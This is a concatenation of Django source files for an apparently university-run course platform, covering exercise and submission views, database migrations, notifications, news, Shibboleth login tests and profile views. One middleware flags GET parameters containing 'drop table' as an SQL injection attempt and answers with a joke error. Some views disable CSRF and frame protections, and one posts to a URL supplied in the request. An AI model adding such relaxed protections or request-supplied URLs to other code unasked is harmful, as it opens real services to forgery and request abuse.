            submission=new_submission)

    def submission_check(self, error=False, request=None):
        if not self.profile:
            issue = _("You need to sign in and enroll to submit exercises.")
            messages.error(self.request, issue)
            return self.exercise.SUBMIT_STATUS.INVALID, False, [issue], []
        submission_status, issues, students = (
            self.exercise.check_submission_allowed(self.profile, request)
        )
        if len(issues) > 0:
            if error:
                messages.error(self.request, "\n".join(issues))
            else:
                messages.warning(self.request, "\n".join(issues))
        submission_allowed = (
            submission_status == self.exercise.SUBMIT_STATUS.ALLOWED
        )
        return submission_status, submission_allowed, issues, students


    def __load_exercisecollection(self, request):
        user = self.profile.user

        if user.is_authenticated():                    
            self.exercise.check_submission(user, no_update=True)

        target_exercises = []
        for t_exercise in self.exercise.exercises:
            it = t_exercise.parent
            ex_url = it.url
            it = it.parent
            while it is not None:
                ex_url = it.url + '/' + ex_url
                it = it.parent

            ex_name = t_exercise.name
            for candidate in t_exercise.name.split('|'):
                if request.LANGUAGE_CODE in candidate:
                    ex_name = candidate[len('{}:'.format(request.LANGUAGE_CODE)):]

            data = {"exercise": t_exercise,
                    "url": reverse("exercise", kwargs={
                        "course_slug": t_exercise.course_module.course_instance.course.url,
                        "instance_slug": t_exercise.course_module.course_instance.url,
                        "module_slug": t_exercise.course_module.url,
                        "exercise_path": ex_url,
                    }),
                    "title": ex_name,
                    "max_points": t_exercise.max_points,
                    "user_points": UserExerciseSummary(t_exercise, request.user).get_points(),
                    }
            target_exercises.append(data)

        title = "{}: {} - {}".format(t_exercise.course_module.course_instance.course.name,
                                     t_exercise.course_module.course_instance.instance_name,
                                     t_exercise.category.name)

        return target_exercises, title


class ExercisePlainView(ExerciseView):
    raise_exception=True
    force_ajax_template=True
    post_url_name="exercise-plain"

    # Allow form posts without the cross-site-request-forgery key.
    # Allow iframe in another domain.
    @method_decorator(csrf_exempt)
    @method_decorator(xframe_options_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)


class ExerciseModelView(ExerciseModelBaseView):
    template_name = "exercise/model.html"
    ajax_template_name = "exercise/_model_files.html"
    access_mode = ACCESS.ENROLLED

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()
        self.models = []
        for url,name in self.exercise.get_models():
            try:
                response = request_for_response(url)
            except RemotePageNotFound:
                self.models.append({'name': name})
            else:
                self.models.append({
                    'name': name,
                    'content': response.text,
                    'html': 'text/html' in response.headers.get('Content-Type'),
                })
        self.note('models')


class ExerciseTemplateView(ExerciseTemplateBaseView):
    template_name = "exercise/template.html"
    ajax_template_name = "exercise/_template_files.html"
    access_mode = ACCESS.ENROLLED

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()
        self.templates = []
        for url,name in self.exercise.get_templates():
            response = request_for_response(url)
            self.templates.append({
                'name': name,
                'content': response.text,
                'html': 'text/html' in response.headers.get('Content-Type'),
            })
        self.note('templates')


class SubmissionView(SubmissionBaseView):
    template_name = "exercise/submission.html"
    ajax_template_name = "exercise/submission_plain.html"

    def get_common_objects(self):
        super().get_common_objects()
        self.page = { "is_wait": "wait" in self.request.GET }
        self.note("page")
        #if not self.request.is_ajax():
        self.get_summary_submissions()


class SubmissionPlainView(SubmissionView):
    raise_exception=True
    force_ajax_template=True

    # Allow iframe in another domain.
    @method_decorator(xframe_options_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)


class SubmissionPollView(SubmissionMixin, BaseView):

    def get(self, request, *args, **kwargs):
        return HttpResponse(self.submission.status, content_type="text/plain")


class SubmittedFileView(SubmissionMixin, BaseView):
    file_kw = "file_id"
    file_name_kw = "file_name"

    def get_resource_objects(self):
        super().get_resource_objects()
        file_id = self._get_kwarg(self.file_kw)
        file_name = self._get_kwarg(self.file_name_kw)
        self.file = get_object_or_404(
            SubmittedFile,
            id=file_id,
            submission=self.submission
        )
        if self.file.filename != file_name:
            raise Http404()

    def get(self, request, *args, **kwargs):
        with open(self.file.file_object.path, "rb") as f:
            bytedata = f.read()

        # Download the file.
        if request.GET.get("download", False):
            response = HttpResponse(bytedata,
                content_type="application/octet-stream")
            response["Content-Disposition"] = 'attachment; filename="{}"'\
                .format(self.file.filename)
            return response

        if self.file.is_passed():
            return HttpResponse(bytedata, content_type=self.file.get_mime())

        return HttpResponse(bytedata.decode('utf-8', 'ignore'),
            content_type='text/plain; charset="UTF-8"')

# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('inheritance', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='LinkService',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),                    
                ('url', models.CharField(help_text=b'The service URL', max_length=256)),
                ('menu_label', models.CharField(help_text=b'A default label to show in the course menu.', max_length=32)),
                ('menu_icon_class', models.CharField(default=b'icon-globe', help_text=b'A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32)),
                ('enabled', models.BooleanField(default=True, help_text=b'If not enabled, the service is disabled for all course instances.')),
            ],
            options={
                'ordering': ['menu_label'],
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='LTIService',
            fields=[
                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService')),                    
                ('consumer_key', models.CharField(help_text=b'The consumer key provided by the LTI service.', max_length=128)),
                ('consumer_secret', models.CharField(help_text=b'The consumer secret provided by the LTI service.', max_length=128)),
            ],
            options={
            },
            bases=('external_services.linkservice',),
        ),
        migrations.CreateModel(
            name='MenuItem',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('menu_label', models.CharField(help_text=b'Overrides service default label shown in the course menu.', max_length=32, null=True, blank=True)),
                ('menu_icon_class', models.CharField(help_text=b'Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32, null=True, blank=True)),
                ('menu_weight', models.IntegerField(default=0, help_text=b'Heavier menu entries are placed after lighter ones.')),
                ('enabled', models.BooleanField(default=True)),
                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.')),                    
                ('service', models.ForeignKey(to='external_services.LinkService')),                    
            ],
            options={
                'ordering': ['course_instance', 'menu_weight', 'menu_label'],
            },
            bases=(models.Model,),
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0001_initial'),
    ]

    operations = [
        migrations.AlterField(
            model_name='linkservice',
            name='enabled',
            field=models.BooleanField(help_text='If not enabled, the service is disabled for all course instances.', default=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='menu_icon_class',
            field=models.CharField(help_text='A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', default='icon-globe', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='menu_label',
            field=models.CharField(help_text='A default label to show in the course menu.', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='url',
            field=models.CharField(help_text='The service URL', max_length=256),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='ltiservice',
            name='consumer_key',
            field=models.CharField(help_text='The consumer key provided by the LTI service.', max_length=128),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='ltiservice',
            name='consumer_secret',
            field=models.CharField(help_text='The consumer secret provided by the LTI service.', max_length=128),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='course_instance',
            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance'),                    
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_icon_class',
            field=models.CharField(null=True, blank=True, help_text='Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_label',
            field=models.CharField(null=True, blank=True, help_text='Overrides service default label shown in the course menu.', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_weight',
            field=models.IntegerField(help_text='Heavier menu entries are placed after lighter ones.', default=0),
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0004_auto_20150828_1210'),
    ]

    operations = [
        migrations.AddField(
            model_name='menuitem',
            name='menu_group_label',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Places menu item under a group label.'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='menuitem',
            name='menu_url',
            field=models.CharField(blank=True, null=True, max_length=256, help_text='A link URL (else service default). Relative URLs are relative to course root.'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='course_instance',
            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services'),                    
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_icon_class',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_label',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Label for the menu link (else service default).'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='service',
            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True),                    
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('contenttypes', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='ModelWithInheritance',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True)),                    
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
    ]

import logging
import traceback
from django.conf import settings
from django.core.mail import send_mail
from django.core.urlresolvers import reverse                    

logger = logging.getLogger('lib.email_messages')


def email_course_error(request, exercise, message, exception=True):
    """
    Sends error message to course teachers or technical support emails if set.
    """
    instance = exercise.course_instance
    if instance.technical_error_emails:
        recipients = instance.technical_error_emails.split(",")
    else:
        recipients = (p.user.email for p in instance.course.teachers.all() if p.user.email)

    error_trace = "-"
    if exception:
        error_trace = traceback.format_exc()

    subject = settings.EXERCISE_ERROR_SUBJECT.format(
        course=instance.course.code,
        exercise=str(exercise))
    body = settings.EXERCISE_ERROR_DESCRIPTION.format(
        message=message,
        exercise_url=request.build_absolute_uri(
            exercise.get_absolute_url()),
        course_edit_url=request.build_absolute_uri(
            instance.get_url('course-details')),
        error_trace=error_trace,
        request_fields=repr(request))
    if recipients:
        try:
            send_mail(subject, body, settings.SERVER_EMAIL, recipients, True)
        except Exception as e:
            logger.exception('Failed to send error emails.')

"""                    
This middleware is an easter egg! It is invoked when any request parameters                    
contain the string "drop table" (a potential SQL injection) and prevents the                    
user from loading any pages. Instead, a response with internal server error code                    
is returned with a "funny" error message. The SQL injection attempt is stored in                    
the session, so that the problem persists even if the user reloads the page.                    
Other users and the actual system are not affected by this middleware.                    

The normal behavior can be restored by giving any request parameter value with the                    
string "restore table" in it.                    
"""                    

from django.http import HttpResponseServerError                    

class SqlInjectionMiddleware(object):                    

    def process_request(self, request):                    
        for var in request.GET:                    
            val = request.GET.get(var).lower()                    
            if "drop table" in val:                    
                request.session["hack_attempt"] = val                    
            if "restore table" in val and "hack_attempt" in request.session:                    
                del request.session["hack_attempt"]                    

        if "hack_attempt" in request.session:                    
            return HttpResponseServerError("Traceback (most recent call last):\nFile \"egg.py\", line 1337, in aplus\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier", content_type="text/plain")                    

        return None

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import lib.models
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0028_auto_20160825_0601'),
    ]

    operations = [
        migrations.CreateModel(
            name='News',
            fields=[
                ('id', models.AutoField(serialize=False, primary_key=True, auto_created=True, verbose_name='ID')),
                ('audience', models.IntegerField(choices=[(1, 'Internal users'), (2, 'External users'), (3, 'Internal and external users')], default=3)),
                ('publish', models.DateTimeField(default=django.utils.timezone.now)),
                ('title', models.CharField(max_length=255)),
                ('body', models.TextField()),
                ('pin', models.BooleanField(default=False)),
                ('alert', models.CharField(choices=[('', 'No alert'), ('danger', 'Red / Danger'), ('info', 'Blue / Info'), ('success', 'Green / Success'), ('warning', 'Yellow / Warning')], max_length=8, blank=True, default='')),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news')),                    
            ],
            options={
                'ordering': ['course_instance', '-pin', '-publish'],
            },
            bases=(models.Model, lib.models.UrlMixin),
        ),
    ]

from django import template
from django.utils import timezone

from lib.errors import TagUsageError
from ..cache import CachedNews
from ..models import News


register = template.Library()


@register.inclusion_tag("news/user_news.html", takes_context=True)
def user_news(context, num, more=0):
    if not 'instance' in context:
        raise TagUsageError()
    if not 'now' in context:
        context['now'] = timezone.now()
    if not 'course_news' in context:
        context['course_news'] = CachedNews(context['instance'])
    news = context['course_news']

    if context['is_course_staff']:
        alerts,news = news.for_staff()
    else:
        user = context['request'].user
        alerts,news = news.for_user(
            not user.is_authenticated()                    
            or user.userprofile.is_external
        )

    i = 0
    for item in news:
        i += 1
        item['collapsed'] = i > num
        if more > 0 and i == more:
            item['begin_more'] = True

    return {
        'is_course_staff': context['is_course_staff'],
        'now': context['now'],
        'alerts': alerts,
        'news': news,
        'more': more,
    }


@register.filter
def is_published(entry, now):
    return entry['publish'] <= now


@register.filter
def news_audience(audience):
    return News.AUDIENCE[audience]

from django.db.models.signals import post_save, post_delete

from lib.cache import CachedAbstract
from .models import Notification


class CachedNotifications(CachedAbstract):
    KEY_PREFIX = "notifications"

    def __init__(self, user):
        super().__init__(user)

    def _generate_data(self, user, data=None):
        if not user or not user.is_authenticated():                    
            return {
                'count': 0,
                'notifications': [],
            }

        def notification_entry(n):
            exercise = n.submission.exercise if n.submission else None
            return {
                'id': n.id,
                'submission_id': n.submission.id if n.submission else 0,
                'name': "{} {}, {}".format(
                    n.course_instance.course.code,
                    (str(exercise.parent)
                        if exercise and exercise.parent else
                     n.course_instance.instance_name),
                    (str(exercise)
                        if exercise else
                     n.subject),
                ),
                'link': n.get_display_url(),
            }

        notifications = list(
            user.userprofile.received_notifications\
                .filter(seen=False)\
                .select_related(
                    'submission',
                    'submission__exercise',
                    'course_instance',
                    'course_instance__course',
                )
        )
        return {
            'count': len(notifications),
            'notifications': [notification_entry(n) for n in notifications],
        }

    def count(self):
        return self.data['count']

    def notifications(self):
        return self.data['notifications']


def invalidate_notifications(sender, instance, **kwargs):
    CachedNotifications.invalidate(instance.recipient.user)


# Automatically invalidate cache when notifications change.
post_save.connect(invalidate_notifications, sender=Notification)
post_delete.connect(invalidate_notifications, sender=Notification)

# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Notification',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('subject', models.CharField(max_length=255)),
                ('notification', models.TextField()),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('seen', models.BooleanField(default=False)),
                ('course_instance', models.ForeignKey(to='course.CourseInstance')),                    
                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile')),                    
                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile')),                    
            ],
            options={
                'ordering': ['-timestamp'],
            },
            bases=(models.Model,),
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0022_auto_20160906_1401'),
        ('notification', '0001_initial'),
    ]

    operations = [
        migrations.AddField(
            model_name='notification',
            name='submission',
            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True),                    
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='notification',
            field=models.TextField(blank=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='sender',
            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True),                    
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='subject',
            field=models.CharField(blank=True, max_length=255),
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('notification', '0002_auto_20160912_1341'),
    ]

    operations = [
        migrations.AlterField(
            model_name='notification',
            name='submission',
            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission'),                    
            preserve_default=True,
        ),
    ]

from django.http import HttpResponse
from django.shortcuts import render
from django.core.urlresolvers import reverse                    


def first(request):

    if request.method == "POST":
        submission = request.POST.get("answer", "").lower()
        points = 0
        if 'hello' in submission:
            points += 1
        if 'a+' in submission:
            points += 1
        return render(request, "exercises/first_result.html", {
            "points": points,
            "max_points": 2,
        })

    return render(request, "exercises/first_exercise.html")


def file(request):

    if request.method == "POST":
        if "myfile" in request.FILES and request.FILES["myfile"].name:
            status = "accepted"
        else:
            status = "error"
        return render(request, "exercises/file_result.html", {
            "status": status,
        })

    return render(request, "exercises/file_exercise.html")


def ajax(request):

    def parse_int(s):
        try:
            return int(s)
        except Exception:
            return 0

    if request.method == "POST":
        points = parse_int(request.POST.get("points"))
        max_points = parse_int(request.POST.get("max_points"))
        url = request.GET.get("submission_url")

        def respond_text(text):
            response = HttpResponse(text)
            response["Access-Control-Allow-Origin"] = "*"
            return response

        if not url:
            return respond_text('{ "errors": ["Missing submission_url"] }')

        import requests
        response = requests.post(url, timeout=3, data={
            "points": points,
            "max_points": max_points,
            "feedback": "You got {} / {} points for your answer.".format(points, max_points),
            "grading_payload": "{}",
        })
        return respond_text(response.text)

    return render(request, "exercises/ajax_exercise.html", {
        "url": request.build_absolute_uri("{}?{}".format(
            reverse("ajax"), request.META.get("QUERY_STRING", "")
        )),
    })

import urllib.parse

from django.conf import settings
from django.contrib.auth.models import User
from django.core.urlresolvers import reverse                    
from django.test import TestCase, modify_settings
from django.utils import timezone


DEF_SHIBD_META = {
    'SHIB_cn': 'Teemu Teekkari',
    'SHIB_mail': 'teemu.teekkari@aalto.fi',
    'Shib-Authentication-Method': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',
    'Shib-Identity-Provider': 'https://locahost/idp/shibboleth',
    'SHIB_displayName': 'Teemudemus',
    'Shib-AuthnContext-Class': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',
    'SHIB_schacPersonalUniqueCode': 'urn:mace:terena.org:schac:personalUniqueCode:int:studentID:aalto.fi:123453',
    'Shib-Session-Index': '_941d95bafed0b1787c81541e627a8c8b',
    'SHIB_sn': 'Teekkari',
    'SHIB_givenName': 'Teemu',
    'Shib-Application-ID': 'default',
    'Shib-Authentication-Instant': str(timezone.now()),
    'Shib-Session-ID': '_92d7c6a832b5c7dafea59ea12ca1289e',
    'SHIB_preferredLanguage': 'fi',
    'SHIB_logouturl': 'https://localhost/idp/aalto_logout.jsp',
    'SHIB_eppn': 'teekkarit@aalto.fi',
}

@modify_settings(
    INSTALLED_APPS={'append': 'shibboleth_login'},
    AUTHENTICATION_BACKENDS={'append': 'shibboleth_login.auth_backend.ShibbolethAuthBackend'},
)
class ShibbolethTest(TestCase):

    def setUp(self):
        self.user = User(
            username='meikalm8@aalto.fi',
            email='',
            first_name='Matti',
            last_name='Sukunimi',
        )
        self.user.set_unusable_password()
        self.user.save()
        self.user.userprofile.student_id = '000'
        self.user.userprofile.save()

        self.login_url = reverse('shibboleth-login')

    def test_invalid(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_eppn']
        response = self._get(meta)
        self.assertEqual(response.status_code, 403)
        self.assertEqual(User.objects.count(), 1)

    def test_valid_new(self):
        meta = DEF_SHIBD_META.copy()
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_without_email(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_mail']
        del meta['SHIB_givenName']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, '{:d}@localhost'.format(user.id))
        self.assertEqual(user.first_name, '')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_without_student_id(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_schacPersonalUniqueCode']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, None)

    def test_valid_old(self):
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username
        del meta['SHIB_sn']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 1)
        user = User.objects.first()
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Sukunimi')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_nonascii(self):
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username.encode('utf-8')
        del meta['SHIB_givenName']
        meta['SHIB_sn'] = 'Meik√§l√§inen'
        del meta['SHIB_schacPersonalUniqueCode']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 1)
        user = User.objects.first()
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Matti')
        self.assertEqual(user.last_name, 'Meik√§l√§inen')
        self.assertEqual(user.userprofile.student_id, '000')

    def test_inactive(self):
        self.user.is_active = False
        self.user.save()
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username.encode('utf-8')
        response = self._get(meta)
        self.assertEqual(response.status_code, 403)
        self.assertEqual(User.objects.count(), 1)

    def _get(self, meta):
        if settings.SHIBBOLETH_VARIABLES_URL_ENCODED:
            for key in meta.keys():
                meta[key] = urllib.parse.quote(meta[key])
        return self.client.generic('GET', self.login_url, **meta)

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0032_auto_20170215_0953'),
        ('exercise', '0025_auto_20170215_0953'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseModuleRequirement',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('negative', models.BooleanField(default=False)),
                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements')),                    
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Threshold',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('name', models.CharField(max_length=255)),
                ('consume_harder_points', models.BooleanField(help_text='Harder points are consumed by easier difficulty requirements.', default=False)),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds')),                    
                ('passed_categories', models.ManyToManyField(blank=True, to='course.LearningObjectCategory')),
                ('passed_exercises', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),
                ('passed_modules', models.ManyToManyField(blank=True, to='course.CourseModule')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='ThresholdPoints',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('limit', models.PositiveIntegerField()),
                ('difficulty', models.CharField(blank=True, max_length=32)),
                ('order', models.PositiveIntegerField(default=1)),
                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points')),                    
            ],
            options={
                'ordering': ['threshold', 'order'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='coursemodulerequirement',
            name='threshold',
            field=models.ForeignKey(to='threshold.Threshold'),                    
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-


from django.db import models, migrations
from django.conf import settings


class Migration(migrations.Migration):

    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
    ]

    operations = [
        migrations.CreateModel(
            name='StudentGroup',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(unique=True, max_length=32)),
                ('description', models.CharField(max_length=256)),
                ('member_limit', models.PositiveIntegerField()),
                ('is_public', models.BooleanField(default=False)),
                ('invitation_key', models.CharField(max_length=10, blank=True)),
            ],
            options={
                'ordering': ['name'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='UserProfile',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('lang', models.CharField(default=b'en_US', max_length=5)),
                ('student_id', models.CharField(max_length=25, null=True, blank=True)),
                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL)),                    
            ],
            options={
                'ordering': ['id'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='studentgroup',
            name='members',
            field=models.ManyToManyField(related_name='groups', to='userprofile.UserProfile'),
            preserve_default=True,
        ),
    ]

from django.core.exceptions import PermissionDenied
from django.template.response import SimpleTemplateResponse

from lib.viewbase import BaseMixin, BaseTemplateView
from authorization.permissions import ACCESS
from .models import UserProfile


class UserProfileMixin(BaseMixin):
    access_mode = ACCESS.STUDENT
    login_redirect = True

    def get_resource_objects(self):
        super().get_resource_objects()
        user = self.request.user
        if user.is_authenticated():                    
            self.profile = profile = user.userprofile
            self.is_external_student = profile.is_external
        else:
            self.profile = None
            self.is_external_student = False

        # Add available for template
        self.note("profile", "is_external_student")


class UserProfileView(UserProfileMixin, BaseTemplateView):
    pass

import logging
from django.conf import settings
from django.contrib.auth import REDIRECT_FIELD_NAME
from django.contrib.auth.views import login as django_login
from django.core.cache import cache
from django.core.cache.utils import make_template_fragment_key
from django.http.response import HttpResponseRedirect
from django.shortcuts import resolve_url
from django.template.loader import TemplateDoesNotExist, get_template
from django.utils.http import is_safe_url
from django.utils.translation import get_language
from django.utils.translation import ugettext_lazy as _

from lib.helpers import settings_text
from authorization.permissions import ACCESS
from .viewbase import UserProfileView


logger = logging.getLogger('userprofile.views')


def login(request):
    """
    Wraps the default login view in Django. Additionally redirects already
    authenticated users automatically to the target.
    """
    if request.user.is_authenticated():                    
        redirect_to = request.POST.get(REDIRECT_FIELD_NAME,
                                       request.GET.get(REDIRECT_FIELD_NAME, ''))
        if not is_safe_url(url=redirect_to, host=request.get_host()):
            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)
        return HttpResponseRedirect(redirect_to)

    return django_login(
        request,
        template_name="userprofile/login.html",
        extra_context={
            'shibboleth_login': 'shibboleth_login' in settings.INSTALLED_APPS,
            'mooc_login': 'social_django' in settings.INSTALLED_APPS,
            'login_title_text': settings_text('LOGIN_TITLE_TEXT'),
            'login_body_text': settings_text('LOGIN_BODY_TEXT'),
            'login_button_text': settings_text('LOGIN_BUTTON_TEXT'),
            'shibboleth_title_text': settings_text('SHIBBOLETH_TITLE_TEXT'),
            'shibboleth_body_text': settings_text('SHIBBOLETH_BODY_TEXT'),
            'shibboleth_button_text': settings_text('SHIBBOLETH_BUTTON_TEXT'),
            'mooc_title_text': settings_text('MOOC_TITLE_TEXT'),
            'mooc_body_text': settings_text('MOOC_BODY_TEXT'),
        }
    )


def try_get_template(name):
    try:
        return get_template(name)
    except TemplateDoesNotExist:
        logger.info("Template %s not found", name)
        return None


class PrivacyNoticeView(UserProfileView):
    access_mode=ACCESS.ANONYMOUS
    template_name="userprofile/privacy.html"

    def get_common_objects(self):
        super().get_common_objects()
        lang = "_" + get_language().lower()
        key = make_template_fragment_key('privacy_notice', [lang])
        privacy_text = cache.get(key)
        if not privacy_text:
            template_name = "privacy_notice{}.html"
            template = try_get_template(template_name.format(lang))
            if not template and len(lang) > 3:
                template = try_get_template(template_name.format(lang[:3]))
            if not template:
                logger.warning("No localized privacy notice for language %s", lang)
                template = try_get_template(template_name.format(''))
            if not template:
                logger.error("No privacy notice at all!")

            privacy_text = template.render() if template else _("No privacy notice. Please notify administration!")
            cache.set(key, privacy_text)
        self.privacy_text = privacy_text
        self.note("privacy_text")

class ProfileView(UserProfileView):
    template_name = "userprofile/profile.html"

from enum import Enum

import psycopg2
from psycopg2.extras import DateTimeTZRange
from jinja2 import Template

from settings import DATABASE, DB_USER
from db_helpers import get_attribute_fields, get_attribute_names
from db_helpers import get_state_names

"""
